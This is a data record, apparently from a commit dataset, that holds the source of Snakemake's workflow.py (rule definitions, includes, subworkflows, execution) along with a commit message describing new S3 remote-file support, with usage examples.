not os.path.isabs(snakefile) and self.included_stack: current_path=os.path.dirname(self.included_stack[-1]) snakefile=os.path.join(current_path, snakefile) snakefile=os.path.abspath(snakefile) if snakefile in self.included: logger.info(\"Multiple include of{} ignored\".format(snakefile)) return self.included.append(snakefile) self.included_stack.append(snakefile) global workflow workflow=self first_rule=self.first_rule code, linemap=parse(snakefile, overwrite_shellcmd=self.overwrite_shellcmd) if print_compilation: print(code) sys.path.insert(0, os.path.dirname(snakefile)) self.linemaps[snakefile]=linemap exec(compile(code, snakefile, \"exec\"), self.globals) if not overwrite_first_rule: self.first_rule=first_rule self.included_stack.pop() def onsuccess(self, func): self._onsuccess=func def onerror(self, func): self._onerror=func def workdir(self, workdir): if self.overwrite_workdir is None: if not os.path.exists(workdir): os.makedirs(workdir) self._workdir=workdir os.chdir(workdir) def configfile(self, jsonpath): \"\"\" Update the global config with the given dictionary. \"\"\" global config c=snakemake.io.load_configfile(jsonpath) update_config(config, c) update_config(config, self.overwrite_config) def ruleorder(self, *rulenames): self._ruleorder.add(*rulenames) def subworkflow(self, name, snakefile=None, workdir=None): sw=Subworkflow(self, name, snakefile, workdir) self._subworkflows[name]=sw self.globals[name]=sw.target def localrules(self, *rulenames): self._localrules.update(rulenames) def rule(self, name=None, lineno=None, snakefile=None): name=self.add_rule(name, lineno, snakefile) rule=self.get_rule(name) def decorate(ruleinfo): if ruleinfo.input: rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1]) if ruleinfo.output: rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1]) if ruleinfo.params: rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1]) if ruleinfo.threads: if not isinstance(ruleinfo.threads, int): raise RuleException(\"Threads value has to be an integer.\", rule=rule) rule.resources[\"_cores\"]=ruleinfo.threads if ruleinfo.resources: args, resources=ruleinfo.resources if args: raise RuleException(\"Resources have to be named.\") if not all(map(lambda r: isinstance(r, int), resources.values())): raise RuleException( \"Resources values have to be integers.\", rule=rule) rule.resources.update(resources) if ruleinfo.priority: if(not isinstance(ruleinfo.priority, int) and not isinstance(ruleinfo.priority, float)): raise RuleException(\"Priority values have to be numeric.\", rule=rule) rule.priority=ruleinfo.priority if ruleinfo.version: rule.version=ruleinfo.version if ruleinfo.log: rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1]) if ruleinfo.message: rule.message=ruleinfo.message if ruleinfo.benchmark: rule.benchmark=ruleinfo.benchmark rule.norun=ruleinfo.norun rule.docstring=ruleinfo.docstring rule.run_func=ruleinfo.func rule.shellcmd=ruleinfo.shellcmd ruleinfo.func.__name__=\"__{}\".format(name) self.globals[ruleinfo.func.__name__]=ruleinfo.func setattr(rules, name, rule) return ruleinfo.func return decorate def docstring(self, string): def decorate(ruleinfo): ruleinfo.docstring=string return ruleinfo return decorate def input(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.input=(paths, kwpaths) return ruleinfo return decorate def output(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.output=(paths, kwpaths) return ruleinfo return decorate def params(self, *params, **kwparams): def decorate(ruleinfo): ruleinfo.params=(params, kwparams) return ruleinfo return decorate def message(self, message): def decorate(ruleinfo): ruleinfo.message=message return ruleinfo return decorate def benchmark(self, benchmark): def decorate(ruleinfo): ruleinfo.benchmark=benchmark return ruleinfo return decorate def threads(self, threads): def decorate(ruleinfo): ruleinfo.threads=threads return ruleinfo return decorate def resources(self, *args, **resources): def decorate(ruleinfo): ruleinfo.resources=(args, resources) return ruleinfo return decorate def priority(self, priority): def decorate(ruleinfo): ruleinfo.priority=priority return ruleinfo return decorate def version(self, version): def decorate(ruleinfo): ruleinfo.version=version return ruleinfo return decorate def log(self, *logs, **kwlogs): def decorate(ruleinfo): ruleinfo.log=(logs, kwlogs) return ruleinfo return decorate def shellcmd(self, cmd): def decorate(ruleinfo): ruleinfo.shellcmd=cmd return ruleinfo return decorate def norun(self): def decorate(ruleinfo): ruleinfo.norun=True return ruleinfo return decorate def run(self, func): return RuleInfo(func) @staticmethod def _empty_decorator(f): return f class RuleInfo: def __init__(self, func): self.func=func self.shellcmd=None self.norun=False self.input=None self.output=None self.params=None self.message=None self.benchmark=None self.threads=None self.resources=None self.priority=None self.version=None self.log=None self.docstring=None class Subworkflow: def __init__(self, workflow, name, snakefile, workdir): self.workflow=workflow self.name=name self._snakefile=snakefile self._workdir=workdir @property def snakefile(self): if self._snakefile is None: return os.path.abspath(os.path.join(self.workdir, \"Snakefile\")) if not os.path.isabs(self._snakefile): return os.path.abspath(os.path.join(self.workflow.basedir, self._snakefile)) return self._snakefile @property def workdir(self): workdir=\".\" if self._workdir is None else self._workdir if not os.path.isabs(workdir): return os.path.abspath(os.path.join(self.workflow.basedir, workdir)) return workdir def target(self, paths): if not_iterable(paths): return flag(os.path.join(self.workdir, paths), \"subworkflow\", self) return[self.target(path) for path in paths] def targets(self, dag): return[f for job in dag.jobs for f in job.subworkflow_input if job.subworkflow_input[f] is self] class Rules: \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\" pass def srcdir(path): \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\" if not workflow.included_stack: return None return os.path.join(os.path.dirname(workflow.included_stack[-1]), path) ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport re\nimport os\nimport sys\nimport signal\nimport json\nimport urllib\nfrom collections import OrderedDict\nfrom itertools import filterfalse, chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.logging import logger, format_resources, format_resource_names\nfrom snakemake.rules import Rule, Ruleorder\nfrom snakemake.exceptions import RuleException, CreateRuleException, \\\n    UnknownRuleException, NoRulesException, print_exception, WorkflowError\nfrom snakemake.shell import shell\nfrom snakemake.dag import DAG\nfrom snakemake.scheduler import JobScheduler\nfrom snakemake.parser import parse\nimport snakemake.io\nfrom snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\nfrom snakemake.persistence import Persistence\nfrom snakemake.utils import update_config\n\n\nclass Workflow:\n    def __init__(self,\n                 snakefile=None,\n                 snakemakepath=None,\n                 jobscript=None,\n                 overwrite_shellcmd=None,\n                 overwrite_config=dict(),\n                 overwrite_workdir=None,\n                 overwrite_configfile=None,\n                 config_args=None,\n                 debug=False):\n        \"\"\"\n        Create the controller.\n        \"\"\"\n        self._rules = OrderedDict()\n        self.first_rule = None\n        self._workdir = None\n        self.overwrite_workdir = overwrite_workdir\n        self.workdir_init = os.path.abspath(os.curdir)\n        self._ruleorder = Ruleorder()\n        self._localrules = set()\n        self.linemaps = dict()\n        self.rule_count = 0\n        self.basedir = os.path.dirname(snakefile)\n        self.snakefile = os.path.abspath(snakefile)\n        self.snakemakepath = snakemakepath\n        self.included = []\n        self.included_stack = []\n        self.jobscript = jobscript\n        self.persistence = None\n        self.global_resources = None\n        self.globals = globals()\n        self._subworkflows = dict()\n        self.overwrite_shellcmd = overwrite_shellcmd\n        self.overwrite_config = overwrite_config\n        self.overwrite_configfile = overwrite_configfile\n        self.config_args = config_args\n        self._onsuccess = lambda log: None\n        self._onerror = lambda log: None\n        self.debug = debug\n\n        global config\n        config = dict()\n        config.update(self.overwrite_config)\n\n        global rules\n        rules = Rules()\n\n    @property\n    def subworkflows(self):\n        return self._subworkflows.values()\n\n    @property\n    def rules(self):\n        return self._rules.values()\n\n    @property\n    def concrete_files(self):\n        return (\n            file\n            for rule in self.rules for file in chain(rule.input, rule.output)\n            if not callable(file) and not file.contains_wildcard()\n        )\n\n    def check(self):\n        for clause in self._ruleorder:\n            for rulename in clause:\n                if not self.is_rule(rulename):\n                    raise UnknownRuleException(\n                        rulename,\n                        prefix=\"Error in ruleorder definition.\")\n\n    def add_rule(self, name=None, lineno=None, snakefile=None):\n        \"\"\"\n        Add a rule.\n        \"\"\"\n        if name is None:\n            name = str(len(self._rules) + 1)\n        if self.is_rule(name):\n            raise CreateRuleException(\n                \"The name {} is already used by another rule\".format(name))\n        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)\n        self._rules[rule.name] = rule\n        self.rule_count += 1\n        if not self.first_rule:\n            self.first_rule = rule.name\n        return name\n\n    def is_rule(self, name):\n        \"\"\"\n        Return True if name is the name of a rule.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        return name in self._rules\n\n    def get_rule(self, name):\n        \"\"\"\n        Get rule by name.\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if not self._rules:\n            raise NoRulesException()\n        if not name in self._rules:\n            raise UnknownRuleException(name)\n        return self._rules[name]\n\n    def list_rules(self, only_targets=False):\n        rules = self.rules\n        if only_targets:\n            rules = filterfalse(Rule.has_wildcards, rules)\n        for rule in rules:\n            logger.rule_info(name=rule.name, docstring=rule.docstring)\n\n    def list_resources(self):\n        for resource in set(\n            resource for rule in self.rules for resource in rule.resources):\n            if resource not in \"_cores _nodes\".split():\n                logger.info(resource)\n\n    def is_local(self, rule):\n        return rule.name in self._localrules or rule.norun\n\n    def execute(self,\n                targets=None,\n                dryrun=False,\n                touch=False,\n                cores=1,\n                nodes=1,\n                local_cores=1,\n                forcetargets=False,\n                forceall=False,\n                forcerun=None,\n                prioritytargets=None,\n                quiet=False,\n                keepgoing=False,\n                printshellcmds=False,\n                printreason=False,\n                printdag=False,\n                cluster=None,\n                cluster_config=None,\n                cluster_sync=None,\n                jobname=None,\n                immediate_submit=False,\n                ignore_ambiguity=False,\n                printrulegraph=False,\n                printd3dag=False,\n                drmaa=None,\n                stats=None,\n                force_incomplete=False,\n                ignore_incomplete=False,\n                list_version_changes=False,\n                list_code_changes=False,\n                list_input_changes=False,\n                list_params_changes=False,\n                summary=False,\n                detailed_summary=False,\n                latency_wait=3,\n                benchmark_repeats=3,\n                wait_for_files=None,\n                nolock=False,\n                unlock=False,\n                resources=None,\n                notemp=False,\n                nodeps=False,\n                cleanup_metadata=None,\n                subsnakemake=None,\n                updated_files=None,\n                keep_target_files=False,\n                allowed_rules=None,\n                greediness=1.0,\n                no_hooks=False):\n\n        self.global_resources = dict() if resources is None else resources\n        self.global_resources[\"_cores\"] = cores\n        self.global_resources[\"_nodes\"] = nodes\n\n        def rules(items):\n            return map(self._rules.__getitem__, filter(self.is_rule, items))\n\n        if keep_target_files:\n\n            def files(items):\n                return filterfalse(self.is_rule, items)\n        else:\n\n            def files(items):\n                return map(os.path.relpath, filterfalse(self.is_rule, items))\n\n        if not targets:\n            targets = [self.first_rule\n                       ] if self.first_rule is not None else list()\n        if prioritytargets is None:\n            prioritytargets = list()\n        if forcerun is None:\n            forcerun = list()\n\n        priorityrules = set(rules(prioritytargets))\n        priorityfiles = set(files(prioritytargets))\n        forcerules = set(rules(forcerun))\n        forcefiles = set(files(forcerun))\n        targetrules = set(chain(rules(targets),\n                                filterfalse(Rule.has_wildcards, priorityrules),\n                                filterfalse(Rule.has_wildcards, forcerules)))\n        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))\n        if forcetargets:\n            forcefiles.update(targetfiles)\n            forcerules.update(targetrules)\n\n        rules = self.rules\n        if allowed_rules:\n            rules = [rule for rule in rules if rule.name in set(allowed_rules)]\n\n        if wait_for_files is not None:\n            try:\n                snakemake.io.wait_for_files(wait_for_files,\n                                            latency_wait=latency_wait)\n            except IOError as e:\n                logger.error(str(e))\n                return False\n\n        dag = DAG(\n            self, rules,\n            dryrun=dryrun,\n            targetfiles=targetfiles,\n            targetrules=targetrules,\n            forceall=forceall,\n            forcefiles=forcefiles,\n            forcerules=forcerules,\n            priorityfiles=priorityfiles,\n            priorityrules=priorityrules,\n            ignore_ambiguity=ignore_ambiguity,\n            force_incomplete=force_incomplete,\n            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,\n            notemp=notemp)\n\n        self.persistence = Persistence(\n            nolock=nolock,\n            dag=dag,\n            warn_only=dryrun or printrulegraph or printdag or summary or\n            list_version_changes or list_code_changes or list_input_changes or\n            list_params_changes)\n\n        if cleanup_metadata:\n            for f in cleanup_metadata:\n                self.persistence.cleanup_metadata(f)\n            return True\n\n        dag.init()\n        dag.check_dynamic()\n\n        if unlock:\n            try:\n                self.persistence.cleanup_locks()\n                logger.info(\"Unlocking working directory.\")\n                return True\n            except IOError:\n                logger.error(\"Error: Unlocking the directory {} failed. Maybe \"\n                             \"you don't have the permissions?\")\n                return False\n        try:\n            self.persistence.lock()\n        except IOError:\n            logger.error(\n                \"Error: Directory cannot be locked. Please make \"\n                \"sure that no other Snakemake process is trying to create \"\n                \"the same files in the following directory:\\n{}\\n\"\n                \"If you are sure that no other \"\n                \"instances of snakemake are running on this directory, \"\n                \"the remaining lock was likely caused by a kill signal or \"\n                \"a power loss. It can be removed with \"\n                \"the --unlock argument.\".format(os.getcwd()))\n            return False\n\n        if self.subworkflows and not printdag and not printrulegraph:\n            # backup globals\n            globals_backup = dict(self.globals)\n            # execute subworkflows\n            for subworkflow in self.subworkflows:\n                subworkflow_targets = subworkflow.targets(dag)\n                updated = list()\n                if subworkflow_targets:\n                    logger.info(\n                        \"Executing subworkflow {}.\".format(subworkflow.name))\n                    if not subsnakemake(subworkflow.snakefile,\n                                        workdir=subworkflow.workdir,\n                                        targets=subworkflow_targets,\n                                        updated_files=updated):\n                        return False\n                    dag.updated_subworkflow_files.update(subworkflow.target(f)\n                                                         for f in updated)\n                else:\n                    logger.info(\"Subworkflow {}: Nothing to be done.\".format(\n                        subworkflow.name))\n            if self.subworkflows:\n                logger.info(\"Executing main workflow.\")\n            # rescue globals\n            self.globals.update(globals_backup)\n\n        dag.check_incomplete()\n        dag.postprocess()\n\n        if nodeps:\n            missing_input = [f for job in dag.targetjobs for f in job.input\n                             if dag.needrun(job) and not os.path.exists(f)]\n            if missing_input:\n                logger.error(\n                    \"Dependency resolution disabled (--nodeps) \"\n                    \"but missing input \"\n                    \"files detected. If this happens on a cluster, please make sure \"\n                    \"that you handle the dependencies yourself or turn of \"\n                    \"--immediate-submit. Missing input files:\\n{}\".format(\n                        \"\\n\".join(missing_input)))\n                return False\n\n        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)\n\n        if printd3dag:\n            dag.d3dag()\n            return True\n        elif printdag:\n            print(dag)\n            return True\n        elif printrulegraph:\n            print(dag.rule_dot())\n            return True\n        elif summary:\n            print(\"\\n\".join(dag.summary(detailed=False)))\n            return True\n        elif detailed_summary:\n            print(\"\\n\".join(dag.summary(detailed=True)))\n            return True\n        elif list_version_changes:\n            items = list(\n                chain(*map(self.persistence.version_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_code_changes:\n            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_input_changes:\n            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n        elif list_params_changes:\n            items = list(\n                chain(*map(self.persistence.params_changed, dag.jobs)))\n            if items:\n                print(*items, sep=\"\\n\")\n            return True\n\n        scheduler = JobScheduler(self, dag, cores,\n                                 local_cores=local_cores,\n                                 dryrun=dryrun,\n                                 touch=touch,\n                                 cluster=cluster,\n                                 cluster_config=cluster_config,\n                                 cluster_sync=cluster_sync,\n                                 jobname=jobname,\n                                 immediate_submit=immediate_submit,\n                                 quiet=quiet,\n                                 keepgoing=keepgoing,\n                                 drmaa=drmaa,\n                                 printreason=printreason,\n                                 printshellcmds=printshellcmds,\n                                 latency_wait=latency_wait,\n                                 benchmark_repeats=benchmark_repeats,\n                                 greediness=greediness)\n\n        if not dryrun and not quiet:\n            if len(dag):\n                if cluster or cluster_sync or drmaa:\n                    logger.resources_info(\n                        \"Provided cluster nodes: {}\".format(nodes))\n                else:\n                    logger.resources_info(\"Provided cores: {}\".format(cores))\n                    logger.resources_info(\"Rules claiming more threads will be scaled down.\")\n                provided_resources = format_resources(resources)\n                if provided_resources:\n                    logger.resources_info(\n                        \"Provided resources: \" + provided_resources)\n                ignored_resources = format_resource_names(\n                    set(resource for job in dag.needrun_jobs for resource in\n                        job.resources_dict if resource not in resources))\n                if ignored_resources:\n                    logger.resources_info(\n                        \"Ignored resources: \" + ignored_resources)\n                logger.run_info(\"\\n\".join(dag.stats()))\n            else:\n                logger.info(\"Nothing to be done.\")\n        if dryrun and not len(dag):\n            logger.info(\"Nothing to be done.\")\n\n        success = scheduler.schedule()\n\n        if success:\n            if dryrun:\n                if not quiet and len(dag):\n                    logger.run_info(\"\\n\".join(dag.stats()))\n            elif stats:\n                scheduler.stats.to_json(stats)\n            if not dryrun and not no_hooks:\n                self._onsuccess(logger.get_logfile())\n            return True\n        else:\n            if not dryrun and not no_hooks:\n                self._onerror(logger.get_logfile())\n            return False\n\n    def include(self, snakefile,\n                overwrite_first_rule=False,\n                print_compilation=False,\n                overwrite_shellcmd=None):\n        \"\"\"\n        Include a snakefile.\n        \"\"\"\n        # check if snakefile is a path to the filesystem\n        if not urllib.parse.urlparse(snakefile).scheme:\n            if not os.path.isabs(snakefile) and self.included_stack:\n                current_path = os.path.dirname(self.included_stack[-1])\n                snakefile = os.path.join(current_path, snakefile)\n            snakefile = os.path.abspath(snakefile)\n        # else it could be an url.\n        # at least we don't want to modify the path for clarity.\n\n        if snakefile in self.included:\n            logger.info(\"Multiple include of {} ignored\".format(snakefile))\n            return\n        self.included.append(snakefile)\n        self.included_stack.append(snakefile)\n\n        global workflow\n\n        workflow = self\n\n        first_rule = self.first_rule\n        code, linemap = parse(snakefile,\n                              overwrite_shellcmd=self.overwrite_shellcmd)\n\n        if print_compilation:\n            print(code)\n\n        # insert the current directory into sys.path\n        # this allows to import modules from the workflow directory\n        sys.path.insert(0, os.path.dirname(snakefile))\n\n        self.linemaps[snakefile] = linemap\n        exec(compile(code, snakefile, \"exec\"), self.globals)\n        if not overwrite_first_rule:\n            self.first_rule = first_rule\n        self.included_stack.pop()\n\n    def onsuccess(self, func):\n        self._onsuccess = func\n\n    def onerror(self, func):\n        self._onerror = func\n\n    def workdir(self, workdir):\n        if self.overwrite_workdir is None:\n            if not os.path.exists(workdir):\n                os.makedirs(workdir)\n            self._workdir = workdir\n            os.chdir(workdir)\n\n    def configfile(self, jsonpath):\n        \"\"\" Update the global config with the given dictionary. \"\"\"\n        global config\n        c = snakemake.io.load_configfile(jsonpath)\n        update_config(config, c)\n        update_config(config, self.overwrite_config)\n\n    def ruleorder(self, *rulenames):\n        self._ruleorder.add(*rulenames)\n\n    def subworkflow(self, name, snakefile=None, workdir=None):\n        sw = Subworkflow(self, name, snakefile, workdir)\n        self._subworkflows[name] = sw\n        self.globals[name] = sw.target\n\n    def localrules(self, *rulenames):\n        self._localrules.update(rulenames)\n\n    def rule(self, name=None, lineno=None, snakefile=None):\n        name = self.add_rule(name, lineno, snakefile)\n        rule = self.get_rule(name)\n\n        def decorate(ruleinfo):\n            if ruleinfo.input:\n                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])\n            if ruleinfo.output:\n                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])\n            if ruleinfo.params:\n                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])\n            if ruleinfo.threads:\n                if not isinstance(ruleinfo.threads, int):\n                    raise RuleException(\"Threads value has to be an integer.\",\n                                        rule=rule)\n                rule.resources[\"_cores\"] = ruleinfo.threads\n            if ruleinfo.resources:\n                args, resources = ruleinfo.resources\n                if args:\n                    raise RuleException(\"Resources have to be named.\")\n                if not all(map(lambda r: isinstance(r, int),\n                               resources.values())):\n                    raise RuleException(\n                        \"Resources values have to be integers.\",\n                        rule=rule)\n                rule.resources.update(resources)\n            if ruleinfo.priority:\n                if (not isinstance(ruleinfo.priority, int) and\n                    not isinstance(ruleinfo.priority, float)):\n                    raise RuleException(\"Priority values have to be numeric.\",\n                                        rule=rule)\n                rule.priority = ruleinfo.priority\n            if ruleinfo.version:\n                rule.version = ruleinfo.version\n            if ruleinfo.log:\n                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])\n            if ruleinfo.message:\n                rule.message = ruleinfo.message\n            if ruleinfo.benchmark:\n                rule.benchmark = ruleinfo.benchmark\n            rule.norun = ruleinfo.norun\n            rule.docstring = ruleinfo.docstring\n            rule.run_func = ruleinfo.func\n            rule.shellcmd = ruleinfo.shellcmd\n            ruleinfo.func.__name__ = \"__{}\".format(name)\n            self.globals[ruleinfo.func.__name__] = ruleinfo.func\n            setattr(rules, name, rule)\n            return ruleinfo.func\n\n        return decorate\n\n    def docstring(self, string):\n        def decorate(ruleinfo):\n            ruleinfo.docstring = string\n            return ruleinfo\n\n        return decorate\n\n    def input(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.input = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def output(self, *paths, **kwpaths):\n        def decorate(ruleinfo):\n            ruleinfo.output = (paths, kwpaths)\n            return ruleinfo\n\n        return decorate\n\n    def params(self, *params, **kwparams):\n        def decorate(ruleinfo):\n            ruleinfo.params = (params, kwparams)\n            return ruleinfo\n\n        return decorate\n\n    def message(self, message):\n        def decorate(ruleinfo):\n            ruleinfo.message = message\n            return ruleinfo\n\n        return decorate\n\n    def benchmark(self, benchmark):\n        def decorate(ruleinfo):\n            ruleinfo.benchmark = benchmark\n            return ruleinfo\n\n        return decorate\n\n    def threads(self, threads):\n        def decorate(ruleinfo):\n            ruleinfo.threads = threads\n            return ruleinfo\n\n        return decorate\n\n    def resources(self, *args, **resources):\n        def decorate(ruleinfo):\n            ruleinfo.resources = (args, resources)\n            return ruleinfo\n\n        return decorate\n\n    def priority(self, priority):\n        def decorate(ruleinfo):\n            ruleinfo.priority = priority\n            return ruleinfo\n\n        return decorate\n\n    def version(self, version):\n        def decorate(ruleinfo):\n            ruleinfo.version = version\n            return ruleinfo\n\n        return decorate\n\n    def log(self, *logs, **kwlogs):\n        def decorate(ruleinfo):\n            ruleinfo.log = (logs, kwlogs)\n            return ruleinfo\n\n        return decorate\n\n    def shellcmd(self, cmd):\n        def decorate(ruleinfo):\n            ruleinfo.shellcmd = cmd\n            return ruleinfo\n\n        return decorate\n\n    def norun(self):\n        def decorate(ruleinfo):\n            ruleinfo.norun = True\n            return ruleinfo\n\n        return decorate\n\n    def run(self, func):\n        return RuleInfo(func)\n\n    @staticmethod\n    def _empty_decorator(f):\n        return f\n\n\nclass RuleInfo:\n    def __init__(self, func):\n        self.func = func\n        self.shellcmd = None\n        self.norun = False\n        self.input = None\n        self.output = None\n        self.params = None\n        self.message = None\n        self.benchmark = None\n        self.threads = None\n        self.resources = None\n        self.priority = None\n        self.version = None\n        self.log = None\n        self.docstring = None\n\n\nclass Subworkflow:\n    def __init__(self, workflow, name, snakefile, workdir):\n        self.workflow = workflow\n        self.name = name\n        self._snakefile = snakefile\n        self._workdir = workdir\n\n    @property\n    def snakefile(self):\n        if self._snakefile is None:\n            return os.path.abspath(os.path.join(self.workdir, \"Snakefile\"))\n        if not os.path.isabs(self._snakefile):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                self._snakefile))\n        return self._snakefile\n\n    @property\n    def workdir(self):\n        workdir = \".\" if self._workdir is None else self._workdir\n        if not os.path.isabs(workdir):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                workdir))\n        return workdir\n\n    def target(self, paths):\n        if not_iterable(paths):\n            return flag(os.path.join(self.workdir, paths), \"subworkflow\", self)\n        return [self.target(path) for path in paths]\n\n    def targets(self, dag):\n        return [f for job in dag.jobs for f in job.subworkflow_input\n                if job.subworkflow_input[f] is self]\n\n\nclass Rules:\n    \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\"\n    pass\n\n\ndef srcdir(path):\n    \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\"\n    if not workflow.included_stack:\n        return None\n    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)\n"}},"msg":"Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read\/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https:\/\/boto.readthedocs.org\/en\/latest\/ref\/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name\/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name\/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/out.txt\")\n        output:\n            \"bucket-name\/out.txt\"\n        run:\n            shell(\"cp {output[0]} .\/\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote\/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard\/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote\/`. This is similar in nature to the function `test_cluster_dynamic\/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS\/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake 